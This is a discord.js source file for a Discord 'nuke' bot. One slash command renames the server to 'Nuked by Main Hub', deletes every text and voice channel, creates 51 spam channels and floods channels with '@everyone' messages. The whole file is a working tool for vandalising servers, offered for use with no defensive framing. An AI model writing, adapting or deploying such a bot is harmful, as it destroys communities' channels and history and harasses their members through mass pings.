const { Client, GatewayIntentBits, ChannelType, Collection, BaseGuildTextChannel } = require('discord.js');
const { token } = require('./config.json');
const client = new Client({intents: GatewayIntentBits.Guilds});

client.once('ready', () =>{
  console.log('Ready!')
})
  


client.on('interactionCreate', async interaction => {
	if (!interaction.isChatInputCommand()) return;

	const { commandName } = interaction;

	if (commandName === 'trololol') {
		await interaction.reply('trololol')
    await interaction.guild.setName('Nuked by Main Hub');
    interaction.guild.channels.cache.each(async (c) =>{
        if(c.type == ChannelType.GuildText || c.type == ChannelType.GuildVoice){
          c.delete();
        }
    })
    for (var i = 0; i < 51; i++) {
      interaction.guild.channels.create({ name: 'nuked-by-mh', reason: 'L' })
    }
    for (var i = 0; i < 51; i++) {
      interaction.guild.channels.cache.each(async (c) =>{
        if(c.type = ChannelType.GuildText) {
            c.send('NUKED BY MAIN HUB @everyone')
        }
    })
    }
    
    
    
  }
});
client.login(token);